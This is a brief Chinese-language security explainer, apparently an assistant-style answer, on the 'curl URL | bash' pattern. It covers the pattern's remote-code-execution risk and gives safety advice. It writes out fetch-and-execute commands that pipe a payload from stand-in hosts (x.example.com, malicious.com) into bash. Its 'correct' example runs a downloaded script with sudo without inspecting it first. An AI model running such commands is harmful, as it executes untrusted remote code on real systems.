执行 `curl http://x.example.com/payload.sh | bash` 是一种常见的 shell 技术，用于远程加载并执行脚本。它的执行过程如下：

1. **`curl http://x.example.com/payload.sh`**  
   从远程服务器下载 `payload.sh` 脚本内容。

2. **`| bash`**  
   将下载的脚本内容作为输入传递给 `bash` 解释器，直接执行。

### 危险性
- **远程代码执行（RCE）**：攻击者可通过构造恶意脚本（如安装后门、窃取数据）完成攻击。
- **依赖信任**：执行远程脚本需完全信任来源，否则可能被注入恶意代码。

### 安全建议
- **禁止直接执行远程脚本**：避免 `| bash` 或 `sh` 执行远程内容。
- **严格验证来源**：仅执行来自可信源的脚本，并进行内容检查。
- **使用沙箱**：在隔离环境中执行未知脚本，防止影响系统。

### 示例（危险）
```bash
curl http://malicious.com/payload.sh | bash
```

### 正确做法
```bash
curl http://trusted.example.com/script.sh -o /tmp/script.sh
chmod +x /tmp/script.sh
sudo /tmp/script.sh
```

请谨慎处理远程脚本执行，避免安全风险。
